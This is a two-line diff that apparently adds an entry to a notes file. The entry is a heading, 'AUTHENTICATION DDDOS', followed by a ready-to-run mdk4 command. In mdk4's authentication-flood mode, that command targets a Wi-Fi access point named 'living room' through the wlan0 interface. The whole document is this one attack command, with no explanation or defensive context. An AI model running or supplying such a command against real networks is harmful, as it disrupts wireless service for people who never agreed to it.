@@ -1,0 +1,2 @@
+** AUTHENTICATION DDDOS ***
+sudo mdk4 wlan0 a "living room"
